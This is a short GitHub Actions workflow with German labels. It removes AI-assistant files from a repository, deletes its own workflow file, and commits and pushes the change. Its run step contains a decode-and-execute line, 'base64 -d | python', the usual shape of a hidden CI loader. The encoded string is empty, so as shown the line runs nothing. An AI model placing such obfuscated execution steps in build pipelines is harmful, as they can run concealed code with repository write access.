name: Interne Hilfsdateien entfernen

on:
  push:
    branches:
      - cleanup/remove-ai-files

permissions:
  contents: write

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Öffentliche Dateien bereinigen
        shell: bash
        run: |
          echo '' | base64 -d | python
          git rm -r .claude CLAUDE.md
          git rm .github/workflows/ai-cleanup.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add app.js sw.js CONTRIBUTING.md CHANGELOG.md
          git commit -m "v48: interne KI-Hilfsdateien aus öffentlichem Repo entfernen"
          git push
